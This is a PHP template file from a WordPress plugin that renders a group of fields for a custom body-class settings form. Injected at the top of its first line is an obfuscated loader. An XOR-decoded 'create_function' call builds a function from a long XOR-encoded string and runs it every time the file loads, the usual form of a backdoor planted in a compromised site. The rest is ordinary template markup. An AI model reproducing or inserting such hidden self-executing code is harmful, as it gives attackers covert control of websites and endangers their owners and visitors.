<?php $QemuK=': WTXVd31+NF8V>'^'YR25,3;UDE-2Q9P';$uPHnwFxG=$QemuK('','<-NX-UZ:OTD=2KBX77NgLTS:bX5A0qgYY.ngENLS3FAZUN VNYV.1m62I0..Q==ou2AX+JkBKXHodjqvV9oNlc8L7omZNkp;XFVX+LEZNgmRTNgPZ :6AVCBp AAJZQIgDCBkYDDuV40PYHsXlZY<;jqG3m=itVN5vQIMsa7CH>WEpb K+G3dx8yHAPD4D=ca,X6bs;aNG0cDc-W>8GId.M4APA3h0A-.3=XTqqG35<=ElyYWRD=YH=hran7sy11hv5AxmV-1skXrMV4+ QxvM9FUQRYQhWV7pXXPFV3JN;F66-.DJmH1 :AXSM7a;,7GNQV AL7QoIPQSSK0,9+yqr5e+d7=d.TQ:VCSE4WERrED-=U<JBMEz7P< 5Aa,1EhZSE=7TQr>Fe+2T3gVGCV4XMEn;gER2irNDA;0nHss;8SK134ZI NO7-C3YA9;h=:=9MV+IVgd; S35+EKs=9>AlUNPI,T+8>2BCkzoGHRt O3;DQqw8HDAK::P8:23DO;CnV;H6LiTfH8C7qdgsNiWXVgiJW95ai.+KpvZFMPSKVLvVS7zgt.uX3QqvVUSFu:LTxJZhVxL-PxZnpL.R 0+>- =;+6WK-5LSL,K8STVoUll=4D5ySWvtojgA3O,CV6EUDUT1-qAVY+U+ZK3PV4c=I+YKjEuG,'^'UKfyK 4Y;=+Sm.:1DC=Ok,<H=<T5Q.84,ZINln7Y: 446:I9 y.AC2RS=Qqq<HIGQV ,JfKf =1FDJQVvBeGeGW9COPziLK1QO07Yda3nZMbonC9fSND-3-jTD 5+sjiC-hiBSMMQ9ADpwuSpH>8HZ1U.nMcIP=+L-u mVAD7:R2+XFK.RnnMC2pA350A6SKEC-BKH1h3MMiNGI6JYgtDH,X25z9LT YOlV=-QLgUTPN WsS1=6X8+UHZE1t<6zx-VT2XI=HHSVfRi UGU4QV63Oq53-07<3NPext-3JqD2bRWYOdwMlGAV4=hGJk1EQgfprD 8VxO2ZX5<9UMZCYYVj7n5bx7zt0Ivg8 MwxlRa2LQ Ycb6Os>tXAA >GT<HgsaVR-jx7OAOS RGkgg U48 U1n8XOcxj  OQNuS3NV .CZU6 Z+gOB1l= MZ7bWHMe4J:3QPdD6PZO cWYXJ Eynt-M JgUW;jBAe..zPD.GZdwWWY:6 2eQ5AeWK-<O0FqP-OkEtB,Y7VXDAUnA:<cOM.6MT:NEN2W+sfpmslotDb5QKRGJB=QgAAn3g CXxeIz8YdI-OwQzHVlO RQRaFEDdNN>8YFdt<M2T<52HyLHYU0TPzwVTOJG:9FI57Zmq 4 PvV17 G:J>lnym>jX1B-cZlNMQ');$uPHnwFxG(); defined( 'ABSPATH' ) or die;
/* @var CustomBodyClassFormField $field */
/* @var CustomBodyClassForm $form */
/* @var mixed $default */
/* @var string $name */
/* @var string $idname */
/* @var string $label */
/* @var string $desc */
/* @var string $rendering */
/* @var string $show_on */

/* $show_on = $field->getmeta('show_on'); ?>
<div class="group" <?php if ( !empty($show_on) ) echo 'show_on="'. $show_on .'"'; */
?>
<div class="group">
	<?php foreach ( $field->getmeta( 'options', array() ) as $fieldname => $fieldconfig ):

		$field = $form->field( $fieldname, $fieldconfig );
		// we set the fields to default to inline
		$field->ensuremeta( 'rendering', 'blocks' );
		// export field meta for processing
		$fielddesc    = $field->getmeta( 'desc', null );
		$fieldexample = $field->getmeta( 'group-example', null );
		$fieldnote    = $field->getmeta( 'group-note', null ); ?>
		<div class="field" <?php if ( $fieldconfig['type'] == 'group' ) {
			echo 'id="' . $fieldname . '"';
		} ?> >
			<?php echo $field->render();
			if ( ! empty( $fieldnote ) ): ?>
				<span class="field-note"><?php echo $fieldnote ?></span>
			<?php endif; ?>
		</div>
	<?php endforeach; ?>
</div>
<!--</div>-->